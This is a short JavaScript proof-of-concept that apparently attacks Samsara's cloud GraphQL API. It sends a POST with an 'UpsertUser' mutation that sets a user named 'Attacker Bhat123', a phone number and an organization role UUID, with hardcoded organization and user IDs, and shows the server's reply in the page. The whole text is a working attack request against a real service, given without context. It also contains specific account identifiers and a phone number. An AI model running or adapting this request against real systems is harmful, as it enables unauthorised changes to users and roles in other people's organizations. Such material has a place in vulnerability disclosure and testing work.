var xhttp = new XMLHttpRequest;
xhttp.onreadystatechange = function() {
    4 == this.readyState && 200 == this.status && (document.getElementById("demo").innerHTML = this.responseText)
}, body = {
    query: "mutation UpsertUser($orgId: int64!, $userId: int64!, $userInfo: UserPatchUpsertBase_InputObject) {\n  upsertUser(orgId: $orgId, userId: $userId, userInfo: $userInfo) {\n    name\n  }\n}\n",
    variables: {
        userId: 243218,
        orgId: 59568,
        userInfo: {
            name: "Attacker Bhat123",
            phone: "+91882505133",
            useWhatsapp: !1,
            organizationRoleUuid: "23d4d8d3-dc10-4e7a-a183-69968751f23e",
            tagRoles: []
        }
    },
    extensions: {
        route: "/o/:org_id/fleet/config/users_and_roles",
        orgId: "59568",
        stashOutput: !0,
        storeDepSet: !0
    }
}, xhttp.open("POST", "https://us10-ws.cloud.samsara.com/r/graphql?q=UpsertUser", !0), xhttp.send(JSON.stringify(body));
